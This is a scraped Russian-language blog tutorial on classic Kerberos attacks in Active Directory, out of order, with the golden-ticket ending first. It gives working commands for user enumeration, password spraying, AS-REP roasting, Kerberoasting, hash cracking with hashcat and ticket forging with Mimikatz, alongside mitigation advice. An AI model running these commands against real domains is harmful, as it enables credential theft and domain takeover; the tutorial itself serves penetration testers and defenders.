AES128 ключа в Mimikatz:\nkerberos::golden /domain:$Domain /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$RandomUser /ptt С использованием AES256 ключа в Mimikatz:\nkerberos::golden /domain:$Domain /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$RandomUser /ptt Заключение На этом рассмотрение классических атак на протокол Kerberos считаю оконченным. В итоге были разобраны основные моменты, рекомендации по противодействию и особенности проведения указанных атак. Надеюсь, что настоящий материал поможет более глубоко и детально разобраться в механизмах атак на протокол Kerberos в Active Directory.\nК сожалению нельзя объять необъятное. Некоторые важные и актуальные темы, например связанные с делегированием, не были затронуты. Также не описывались атаки, создающие условия для дальнейшего проведения атак на Kerberos. Все это возможно будет рассказано позже.\nСсылки Общие источники из которых черпал информацию по атакам на Kerberos\n Монументальный труд Eloy Pérez Комплексная статья Сергея Ефимова “Разбираем атаки на Kerberos с помощью Rubeus”. Части 1 и 2 компании T.Hunter Kerberoasting without SPN от Арсения Шароглазова  Полезные блоги для дальнейшего изучения, в том числе отличных от Kerberos, атак на Active Directory:\n Блог Will Schroeder (harmj0y) Блог Charlie Bromberg (Shutdown) Блог Pixis  Картинки:\n Матрешки взяты отсюда Скриншот экрана входа отсюда Цербер отсюда  ","wordCount":"3718","inLanguage":"en","image":"https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo.jpg","datePublished":"2022-08-07T11:30:03Z","dateModified":"2022-08-07T11:30:03Z","author":{"@type":"Person","name":"Ardent101"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ardent101.github.com/posts/kerberos_general_attacks/"},"publisher":{"@type":"Organization","name":"Ardent101","logo":{"@type":"ImageObject","url":"https://ardent101.github.com/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ardent101.github.com/ accesskey=h title="Главная (Alt + H)"><img src=https://ardent101.github.com/apple-touch-icon.png alt=logo aria-label=logo height=35>Главная</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://ardent101.github.com/archives/ title=Архив><span>Архив</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки.</h1><div class=post-meta><span title="2022-08-07 11:30:03 +0000 +0000">August 7, 2022</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;Ardent101</div></header><figure class=entry-cover><img loading=lazy srcset="https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo_hua23cea858152013d192f9b92f161583a_185140_360x0_resize_q75_box.jpg 360w ,https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo_hua23cea858152013d192f9b92f161583a_185140_480x0_resize_q75_box.jpg 480w ,https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo_hua23cea858152013d192f9b92f161583a_185140_720x0_resize_q75_box.jpg 720w ,https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo_hua23cea858152013d192f9b92f161583a_185140_1080x0_resize_q75_box.jpg 1080w ,https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo.jpg 1200w" sizes="(min-width: 768px) 720px, 100vw" src=https://ardent101.github.com/posts/kerberos_general_attacks/images/kerberos_logo.jpg alt width=1200 height=646></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%d0%b2%d1%81%d1%82%d1%83%d0%bf%d0%bb%d0%b5%d0%bd%d0%b8%d0%b5 aria-label=Вступление>Вступление</a><ul><li><a href=#%d0%b0%d1%82%d0%b0%d0%ba%d0%b0-%d0%bd%d0%b0-%d0%bf%d0%be%d0%b4%d0%b1%d0%be%d1%80-%d0%b8%d0%bc%d0%b5%d0%bd-%d0%bf%d0%be%d0%bb%d1%8c%d0%b7%d0%be%d0%b2%d0%b0%d1%82%d0%b5%d0%bb%d0%b5%d0%b9 aria-label="Атака на подбор имен пользователей">Атака на подбор имен пользователей</a></li><li><a href=#%d1%80%d0%b0%d1%81%d0%bf%d1%8b%d0%bb%d0%b5%d0%bd%d0%b8%d0%b5-%d0%bf%d0%b0%d1%80%d0%be%d0%bb%d1%8f aria-label="Распыление пароля">Распыление пароля</a></li><li><a href=#as-req-roasting aria-label="AS-REQ roasting">AS-REQ roasting</a></li><li><a href=#as-rep-roasting aria-label="AS-REP roasting">AS-REP roasting</a></li><li><a href=#kerberoasting aria-label=Kerberoasting>Kerberoasting</a><ul><li><a href=#kerberoasting--anyspn aria-label="Kerberoasting + AnySPN">Kerberoasting + AnySPN</a></li><li><a href=#%d1%86%d0%b5%d0%bb%d0%b5%d0%b2%d0%be%d0%b9-kerberoasting aria-label="Целевой Kerberoasting">Целевой Kerberoasting</a></li></ul></li><li><a href=#pass-the-key--overpass-the-hash aria-label="Pass-the-key / Overpass The Hash">Pass-the-key / Overpass The Hash</a></li><li><a href=#pass-the-ticket-ptt--pass-the-cache aria-label="Pass-the-Ticket (PtT) / Pass-the-Cache">Pass-the-Ticket (PtT) / Pass-the-Cache</a></li><li><a href=#ptt--anyspn aria-label="PtT + AnySPN">PtT + AnySPN</a></li><li><a href=#silver-ticket aria-label="Silver Ticket">Silver Ticket</a></li><li><a href=#golden-ticket aria-label="Golden Ticket">Golden Ticket</a></li></ul></li><li><a href=#%d0%b7%d0%b0%d0%ba%d0%bb%d1%8e%d1%87%d0%b5%d0%bd%d0%b8%d0%b5 aria-label=Заключение>Заключение</a><ul><li><a href=#%d1%81%d1%81%d1%8b%d0%bb%d0%ba%d0%b8 aria-label=Ссылки>Ссылки</a></li></ul></li></ul></div></details></div><div class=post-content><h2 id=вступление>Вступление<a hidden class=anchor aria-hidden=true href=#вступление>#</a></h2><p>Для Active Directory известно множество атак с использованием протокола Kerberos. Попробую перечислить некоторые из них:</p><p>Атаки на повышение привилегий</p><ol><li>Перебор пользователей</li><li>Распыление / Подбор паролей</li><li>AS-REQ roasting</li><li>AS-REP roasting</li><li>Kerberoasting (AnySPN, целенаправленный Kerberoasting)</li></ol><p>Атаки для дальнейшего продвижения</p><ol start=6><li>Pass-the-Key / Overpass-the-hash</li><li>Pass-the-Ticket / Pass-the-Cache</li></ol><p>Атаки для закрепления</p><ol start=8><li>Silver Ticket</li><li>Golden Ticket</li><li>Skeleton Key</li><li>Diamond Ticket</li></ol><p>Атаки на делегирование</p><ol start=12><li>На неограниченное делегирование</li><li>На ограниченное</li><li>На ограниченное на основе ресурсов</li></ol><p>А также:</p><ol start=15><li>Bronze bit</li><li>sAMAccountName спуфинг</li><li>Pass the certificate</li><li>MS14-068 (Forged PAC)</li><li>Krbrelay</li><li>Атаки на доверие между доменами</li><li>&mldr;</li></ol><p>Далее будут разобраны &ldquo;классические&rdquo; атаки из пунктов 1-9. Разбор остальных атак требует изложения дополнительного теоретического материала и пока только в планах на будущее.</p><blockquote><p>Демонстрация некоторых атак совершалась на <a href=https://tryhackme.com/room/attackingkerberos>стенде</a> с TryHackMe.</p></blockquote><h3 id=атака-на-подбор-имен-пользователей>Атака на подбор имен пользователей<a hidden class=anchor aria-hidden=true href=#атака-на-подбор-имен-пользователей>#</a></h3><p><strong>Условие для проведения атаки</strong>: сетевая доступность контроллера домена.</p><p><strong>Результат успешной атаки</strong>: перечень, содержащий некоторые действительные имена учетных записей пользователей домена.</p><p>Kerberos позволяет узнать существует ли учетная запись при подборе имени с неверным паролем. Атака заключается в отправке KRB_AS_REQ сообщения с отключенной предварительной аутентификацией. Контроллер домена обрабатывает указанное сообщение по-разному в зависимости от наличия или отсутствия учетной записи. Возможны три варианта:</p><ol><li>Если учетная запись отсутствует, то в ответе будет «пользователь не известен».</li><li>Если учетная запись присутствует и у нее включена предварительная аутентификация (по умолчанию в Active Directory), то в ответе будет «требуется предварительная аутентификация».</li><li>Если учетная запись присутствует и у нее отключена предварительная аутентификация, то в ответ будет передано KRB_AS_REP сообщение.</li></ol><blockquote><p>Примечание: неудачные попытки перебора не логируются в качестве событий неуспешного входа (ID 4625). Поэтому считается, что подбор имен пользователей через Kerberos чуть более скрытный, чем с помощью некоторых других способов. Есть и другое преимущество счетчик неверных попыток ввода пароля не увеличивается. Таким образом риск заблокировать учетную запись при повторном подборе имени пользователя отсутствует.</p></blockquote><p><strong>Команда для проведения атаки</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>./kerbrute_linux_amd64 userenum -d <span class=nv>$Domain_fqdn</span> <span class=nv>$users_list</span> --output <span class=nv>$filename</span>
</span></span></code></pre></div><p><img src=images/kerbrute_output.png alt=kerbrute></p><p><strong>Рекомендации по противодействию</strong>:</p><ul><li>Отслеживать аномальные запросы на аутентификацию с неуспешной предварительной аутентификацией, например при помощи системы анализа трафика и (или) системы управления событиями информационной безопасности.</li></ul><p><strong>Дополнительно</strong>:</p><p>Имена пользователей можно попытаться добыть из разных источников:</p><ul><li>Профили в социальных сетях</li><li>Метаданные из файлов, располагающихся в целевом домене (<a href=https://github.com/ElevenPaths/FOCA>FOCA</a>)</li><li>Почтовые <a href=https://phonebook.cz/>адреса</a></li></ul><p>Имена как правило назначаются в соответствие с каким-то шаблоном. Пользователь Иванов Василий Петрович например может быть назван:
<em>pivanov, ivanov_vp, p.ivanov, ivanovp, …</em> Полезно сначала узнать шаблон, а потом в соответствие с ним пробовать перечислять имена.</p><p><strong>Личный комментарий</strong>: В моей практике редко доводилось проводить указанную атаку, так как обычно в ходе внутреннего тестирование на проникновение получить перечень доменных имен пользователей проще при помощи Relay на LDAP c последующим выполнением <a href=https://github.com/dirkjanm/ldapdomaindump>ldapdomaindump</a>. Описание указанной атаки выходит за рамки материала, но для самообразования рекомендую следующий <a href=https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/>пост</a>.</p><p>Для желающих попробовать провести атаку на перебор имени на HackTheBox есть стенд Sauna.</p><h3 id=распыление-пароля>Распыление пароля<a hidden class=anchor aria-hidden=true href=#распыление-пароля>#</a></h3><p><strong>Условие для проведения атаки</strong>: сетевая доступность контроллера домена.</p><p><strong>Результат успешной атаки</strong>: доступ с правами атакованной учетной записи.</p><p>Атака заключается в попытке найти учетную запись с определенным паролем. Грубо говоря, происходит подбор имени пользователя при зафиксированном пароле. При этом необходимо понимать, что каждая неудачная попытка подбора пароля учетной записи увеличивает счетчик неверных попыток ввода пароля. По достижению порогового значения счетчика учетная запись будет заблокирована. Таким образом прежде, чем приступать к подбору пароля желательно узнать действующую парольную политику. Интерес представляют следующие параметры:</p><ul><li>Сложность пароля - какие символы обязательно должны присутствовать в пароле. По умолчанию должны использоваться 3 из 4 следующих категорий: строчные буквы, заглавные буквы, цифры, спецсимволы (~!@#$%^&*_-+=`|(){}[]:;"&rsquo;&lt;>,.?/)</li><li>Минимальная длина пароля. По умолчанию составляет 7 символов.</li><li>Порог блокировки учетной записи. По умолчанию равен 0, то есть учетная запись не блокируется. Если значение равно X>0, то после достижения счетчика блокировки X, учетная запись будет заблокирована.</li><li>Время до сброса счетчика блокировки. По умолчанию не определено, так как имеет смысл, только когда порог блокировки ненулевой.</li><li>Длительность блокировки учетной записи. По умолчанию 30 минут.</li></ul><p>Атаку целесообразно повторять X-1 раз за не менее чем Y + 5 минут (X - порог блокировки учетной записи, Y - время до сброса счетчика).</p><p><strong>Команда для проведения атаки</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>./kerbrute_linux_amd64 passwordspray -d <span class=nv>$Domain_FQDN</span> <span class=nv>$users_list</span> <span class=nv>$Password</span>
</span></span></code></pre></div><p><img src=images/pass_spray.png alt=kerbrute_pass_spray></p><p><strong>Рекомендации по противодействию</strong>:</p><ul><li>Реализовать строгую парольную политику:<ul><li>Минимальная длина пароля: 10 для пользователей, 14 для администраторов.</li><li>Порог блокировки учетной записи: 5.</li><li>Время до сброса: 30 минут.</li><li>Длительность блокировки и сложность: по умолчанию.</li><li>Запретить использовать предыдущие пароли. Добавить правило, чтобы новый пароль отличался от предыдущих на не менее, чем 3 символа.</li></ul></li><li>Периодически выгружать NT-хэши из NTDS.dit и проводить инвентаризацию учетных записей на предмет наличия словарных паролей. Простенький словарь для инвентаризации можно взять <a href=https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm>здесь</a>.</li><li>С использованием межсетевых экранов ограничить доступ к KDC для сетевых объектов, не входящих в белый список.</li></ul><p>Источник: <a href=https://github.com/ropnop/kerbrute>Kerbrute</a></p><h3 id=as-req-roasting>AS-REQ roasting<a hidden class=anchor aria-hidden=true href=#as-req-roasting>#</a></h3><p><strong>Условие для проведения атаки</strong>:</p><ul><li>Получение KRB_AS_REQ сообщения с включенной предварительной аутентификацией</li></ul><p><strong>Варианты выполнения условия</strong>:</p><ul><li>Сообщение можно получить в результате атаки, направленной на перехват сетевого трафика (ARP spoofing, ICMP redirect, поддельный DHCP сервер, IPv6 spoofing).</li><li>Сообщение можно извлечь из дампа сетевого трафика (<a href=https://github.com/lgandx/PCredz>PCredz</a>)</li></ul><p><strong>Результат успешной атаки</strong>:</p><ul><li>Доступ с правами атакованной учетной записи</li></ul><p>Из <a href=/posts/kerberos_theory/#krb_as_req-%D1%81-%D0%BF%D1%80%D0%B5%D0%B4%D0%B2%D0%B0%D1%80%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%BE%D0%B9-%D0%B0%D1%83%D1%82%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D0%B5%D0%B9>анализа</a> содержимого KRB_AS_REQ сообщения с включенной предварительной аутентификацией видно, что метка времени зашифровывается с использованием полученного из пароля ключа пользователя. Таким образом при наличии указанного сообщения можно попытаться оффлайн (без взаимодействия с сетью на рабочей станции атакующего) подобрать пароль по словарю.</p><p><strong>Команды для проведения атаки в Linux</strong>:</p><p>Извлечение аутентификационных данных из pcap файла:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Pcredz -f <span class=nv>$filepath</span>
</span></span></code></pre></div><p>Извлечение аутентификационных данных из всех pcap файлов в папке:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Pcredz -d <span class=nv>$dir_path</span>
</span></span></code></pre></div><p>Извлечение аутентификационных данных при прослушивании сетевого интерфейса</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Pcredz -i <span class=nv>$interface_name</span> -v
</span></span></code></pre></div><p>Hashcat:</p><p>Если штамп времени зашифрован с использованием RC4:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -m <span class=m>7500</span> <span class=nv>$AS_Req_rc4_hashes</span> <span class=nv>$dictionary</span>
</span></span></code></pre></div><p>В случае AES256:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -m <span class=m>19900</span> <span class=nv>$AS_Req_AES256_hashes</span> <span class=nv>$dictionary</span>
</span></span></code></pre></div><p><strong>Рекомендация по противодействию</strong>:</p><ul><li>Реализовать строгую парольную политику (смотри <a href=#%D1%80%D0%B0%D1%81%D0%BF%D1%8B%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8F>ранее</a>)</li><li>С использованием встроенных возможностей телекоммуникационного оборудования реализовать защиту от атак, направленных на перехват сетевого трафика (DHCP snooping, Dynamic ARP Protection, IP Source Guard и т.д.).</li><li>Для привилегированных учетных записей использовать двухфакторную аутентификацию.</li></ul><p><strong>Личный комментарий</strong>: атака не пользуется особой популярностью.</p><p><a href=https://improsec.com/tech-blog/asreqroast-from-mitm-to-hash%20>Источник</a></p><h3 id=as-rep-roasting>AS-REP roasting<a hidden class=anchor aria-hidden=true href=#as-rep-roasting>#</a></h3><p><strong>Условие для проведения атаки</strong>: знание имени (принципала) учетной записи с отключенной предварительной аутентификацией</p><p>Вариант выполнения условия при отсутствии прав непривилегированного пользователя домена:</p><ul><li>Узнать принципал можно после Relay на контроллер домена по LDAP c последующей выгрузкой перечня всех пользователей и попыткой пройти аутентификацию без проверки подлинности от имени каждого из них.</li></ul><p>Варианты выполнения условия при наличии прав непривилегированного пользователя домена:</p><ul><li>Выгрузить с помощью <a href=https://github.com/dirkjanm/ldapdomaindump>Ldapdomaindump</a></li><li>Посмотреть в Bloodhound</li></ul><p><strong>Результат успешной атаки</strong>:</p><ul><li>Доступ с правами атакованной учетной записи</li></ul><p>Как было рассмотрено <a href=/posts/kerberos_theory/#krb_as_req>в 1 части</a>, при отправке атакующим на контроллер домена KRB_AS_REQ сообщения от имени пользователя, у которого отключена предварительная аутентификация, в ответ присылается KRB_AS_REP сообщение, содержащее сессионный ключ, зашифрованный с использованием секрета указанного пользователя. Таким образом можно попытаться подобрать пароль оффлайн по словарю.</p><p><strong>Команды для реализации атаки в Linux</strong>:</p><p>При отсутствии учетной записи приходиться отправлять KRB_AS_REQ сообщения от имени каждого выявленного пользователя домена. Возьмем результат kerbrute из предыдущей <a href=#%D0%B0%D1%82%D0%B0%D0%BA%D0%B0-%D0%BD%D0%B0-%D0%BF%D0%BE%D0%B4%D0%B1%D0%BE%D1%80-%D0%B8%D0%BC%D0%B5%D0%BD-%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D0%B5%D0%B9>атаки</a>:</p><p><img src=images/kerbrute_output_file.png alt=kerbrute></p><p>Отформатируем его надлежащим образом:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat found_users.txt <span class=p>|</span> grep <span class=s2>&#34;VALID&#34;</span> <span class=p>|</span> cut -f2 &gt; formated_found_users.txt
</span></span></code></pre></div><p><img src=images/format_found_users.png alt=kerbrute_formated></p><p>С использованием полученного файла, содержащего список действительных имен, проведем атаку:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetNPUsers <span class=nv>$Domain_FQDN</span>/ -usersfile <span class=nv>$users_list</span> -outputfile <span class=nv>$file</span>
</span></span></code></pre></div><p><img src=images/impacket_asrep.png alt=impacket_asrep></p><p><figure><img src=images/impacket_asrep_hashes.png alt=asrep_hashes><figcaption><p style=text-align:center>Содержимое файла AS_REP_hashes.txt после выполнения запросов</p></figcaption></figure></p><blockquote><p>Примечание: получение ошибки <em>«KRB_AP_ERR_SKEW (Clock skew too great)»</em> означает, что время на контроллере домена и рабочей станции атакующего значительно отличается. В Kerberos, как было рассмотрено ранее, многое зависит от значения часов. Таким образом, прежде чем повторять атаку следует синхронизировать время с помощью следующей команды:</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ntpdate <span class=nv>$DC_IP</span>
</span></span></code></pre></div><p>Альтернативно, при наличии прав пользователя домена можно сразу получить список учетных записей с отключенной предварительной аутентификацией при помощи LDAP и отправить KRB_AS_REQ сообщения только от их имени:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetNPUsers <span class=nv>$domain_FQDN</span>/<span class=nv>$domain_username</span>:<span class=nv>$user_pass</span> -request -outputfile <span class=nv>$file</span>
</span></span></code></pre></div><p><img src=images/impacket_asrep_with_user.png alt=impacket_asrep_user></p><p>Также при наличии прав пользователя можно собрать информацию для Bloodhound и уже там посмотреть активные учетные записи с отключенной предварительной аутентификацией:</p><p><img src=images/bloodhound_asrep.png alt=BH_asrep></p><p>У выявленных учетных записей полезно проверить права доступа:</p><p><img src=images/bloodhound_asrep_hv.png alt=bh_as_rep_hv></p><p>В данном случае видно, что одна из учетных записей с отключенной проверкой подлинности является администратором домена, что при наличии словарного пароля или отсутствии жесткой парольной политики для указанной учетной записи, является существенным недостатком.</p><p><strong>Команды для реализации атаки в Windows</strong>:</p><p>Для проведения атак на Kerberos с Windows существует полезный инструмент - Rubeus. Обычно подразумевается, что Rubeus запущен в контексте процесса с правами пользователя домена, поэтому в аргументах аутентификационные данные не указываются.</p><blockquote><p>Лирическое отступление: название Rubeus выбрано не случайно. Это имя Хагрида из Гарри Поттера. Он любил страшных животных и умел с ними обращаться. В частности Хагрид знал, что если поиграть на арфе, то можно усыпить Цербера.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Rubeus.exe asreproast /outfile:<span class=nv>$result_File</span>
</span></span></code></pre></div><p><img src=images/rubeus_asrep.png alt=rubeus_asrep></p><p>Получив заветные хэши, можно осуществить оффлайн подбор пароля с помощью Hashcat:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -m <span class=m>18200</span> <span class=nv>$asrep_hashes_file</span> <span class=nv>$dict_file</span>
</span></span></code></pre></div><p><strong>Рекомендация по противодействию</strong>:</p><ul><li>Реализовать строгую парольную политику (смотри <a href=#%D1%80%D0%B0%D1%81%D0%BF%D1%8B%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8F>ранее</a>)</li><li>Провести инвентаризацию учетных записей на предмет отключенной предварительной аутентификации. Для каждой из выявленных учетных записей рассмотреть целесообразность отключения. В случае невозможности включения предварительной аутентификации следует руководствоваться принципом минимальных привилегий и не наделять выявленные учетные записи правами уровня администратора домена.</li><li>С использованием межсетевых экранов ограничить доступ к KDC для сетевых объектов, не входящих в белый список.</li></ul><p><strong>Личный комментарий</strong>: учетные записи с отключенной предварительной проверкой подлинности, как правило встречаются нечасто, а если и встречаются, то их немного. Тем не менее следует проверять их наличие и права в ходе каждого внутреннего тестирования на проникновение.</p><p>Для самостоятельной тренировки есть стенд Forest на HackTheBox (доступен по платной подписке).</p><h3 id=kerberoasting>Kerberoasting<a hidden class=anchor aria-hidden=true href=#kerberoasting>#</a></h3><p><strong>Условие для проведения атаки</strong>: права уровня непривилегированного пользователя домена.</p><p>Некоторые варианты выполнения условия:</p><ul><li>AS-REP roasting</li><li>Подбор или распыление пароля</li><li>Эксплуатация критической уязвимости</li><li>Обнаружить в открытом виде в общедоступной сетевой папке</li><li>Подбор методом оффлайн перебора по NetNTLMv2 хэшу</li></ul><p><strong>Результат успешной атаки</strong>: доступ с правами атакованной учетной записи.</p><p>Первым делом атакующий осуществляет поиск учетных записей, обладающих SPN. Делается это при помощи LDAP, например с использованием следующего запроса:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=s2>&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span>
</span></span></code></pre></div><blockquote><p>Примечание 1: Для выполнения приведенного выше запроса требуются права уровня непривилегированного пользователя домена.<br>Примечание 2: Осуществлять поиск среди учетных записей класса &ldquo;компьютер&rdquo; нет смысла, так как пароль к указанным учетным записям не является словарным.</p></blockquote><p>Далее атакующий отправляет KRB_TGS_REQ сообщения с указанием SPN, ассоциированными с выявленными учетными записями. Контроллер домена не занимается авторизацией, то есть не проверяет имеет ли скомпрометированная учетная запись право доступа к запрашиваемым сервисам, поэтому в ответ отправляются сообщения, содержащие TGS билеты, зашифрованные с использованием секретов сервисов. Таким образом, получив TGS-билеты, атакующий может попробовать подобрать пароль к сервисам по словарю оффлайн.</p><p><strong>Команды для проведения атаки в Linux</strong>:</p><p>При необходимости синхронизируем время:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ntpdate <span class=nv>$DC_IP</span>
</span></span></code></pre></div><p>Осуществляем поиск поиск всех учетных записей, имеющих SPN, и запрашиваем для них TGS:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetUserSPNs -dc-ip <span class=nv>$DC_IP</span> <span class=nv>$Domain_FQDN</span>/<span class=nv>$username</span>:<span class=nv>$password</span> -request -outputfile <span class=nv>$file</span>
</span></span></code></pre></div><p><img src=images/impacket_kerberoasting.png alt=impacket_kerberoasting></p><p><strong>Команды для проведения атаки в Windows</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Rubeus.exe kerberoast /outfile:<span class=nv>$file</span>
</span></span></code></pre></div><p><img src=images/rubeus_kerberoasting.png alt=rubeus)kerberoasting></p><blockquote><p>Примечание 3: Извлечь TGS билеты и провести оффлайн подбор пароля также возможно в результате анализа сетевого трафика с помощью <a href=https://github.com/nidem/kerberoast/blob/master/extracttgsrepfrompcap.py>extracttgsrepfrompcap</a></p></blockquote><p>Выявить сервисные учетные записи, а также посмотреть права, которыми они обладают, можно с помощью Bloodhound:</p><p><figure><img src=images/bloodhound_kerberoastable.png alt=bloodhound_kerberoasting><figcaption><p style=text-align:center>Поиск учетных записей, обладающих SPN</p></figcaption></figure></p><p><figure><img src=images/bloodhound_kerberoastable_hv.png alt=bloodhound_kerberoasting_high_values><figcaption><p style=text-align:center>Поиск привилегированных учетных записей, обладающих SPN</p></figcaption></figure></p><p>В заключении выполняем перебор с Hashcat:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -m <span class=m>13100</span> <span class=nv>$kerberos_hashes</span> <span class=nv>$dictionary</span>
</span></span></code></pre></div><p><figure><img src=images/hashcat_kerberoasting.png alt=hashcat_tgs><figcaption><p style=text-align:center>Пример успешного оффлайн подбора пароля</p></figcaption></figure><figure><img src=images/hashcat_kerberoasting_result.png alt=hashcat_tgs_result><figcaption><p style=text-align:center>Пример результирующего вывода hashcat</p></figcaption></figure></p><h4 id=kerberoasting--anyspn>Kerberoasting + AnySPN<a hidden class=anchor aria-hidden=true href=#kerberoasting--anyspn>#</a></h4><p>Существуют способы выполнить Kerberoasting, не зная SPN имени сервиса. <a href=/posts/kerberos_theory/#%D1%81%D0%BF%D0%B8%D1%81%D0%BE%D0%BA-%D1%82%D0%B5%D1%80%D0%BC%D0%B8%D0%BD%D0%BE%D0%B2>Ранее</a> уже подробно рассматривался формат SPN: <em>service-name/host:port@REALM</em>.</p><p>У одной учетной записи может быть несколько сервисов, то есть несколько SPN. Проблема заключается в том, что поле &ldquo;имя сервиса&rdquo; в ходе KRB-запросов не зашифровывается. То есть вместо одного сервиса учетной записи можно указать другой и ничего не сломается. Атака методом подмены SPN называется <a href=https://swarm.ptsecurity.com/kerberoasting-without-spns/>AnySPN</a>.</p><p>Таким образом возможна следующая вариация Kerberoasting: если известно имя учетной записи (<em>SAM Account Name, SAN</em>) и что она обладает каким-то SPN, то все равно можно запросить TGS билет, указав SAN вместо SPN, и Kerberoasting отработает.</p><p>Подытожим: возможно получить TGS-билет, не зная названия сервиса.</p><h4 id=целевой-kerberoasting>Целевой Kerberoasting<a hidden class=anchor aria-hidden=true href=#целевой-kerberoasting>#</a></h4><p><strong>Условие для проведения атаки</strong>: наличие одного из прав - GenericAll, GenericWrite, WriteProperty или Validated-SPN в отношении атакуемой учетной записи.</p><p><strong>Результат успешной атаки</strong>: доступ с правами атакованной учетной записи</p><p>Наличие одного из перечисленных выше прав, позволяет установить SPN у атакуемой учетной записи. Таким образом указанная учетная запись становится подверженной атаке Kerberoasting.</p><p><strong>Команда для выполнения атаки</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>targetedKerberoast.py -v -d <span class=nv>$domain_FQDN</span> -u <span class=nv>$username</span> -p <span class=nv>$password</span>
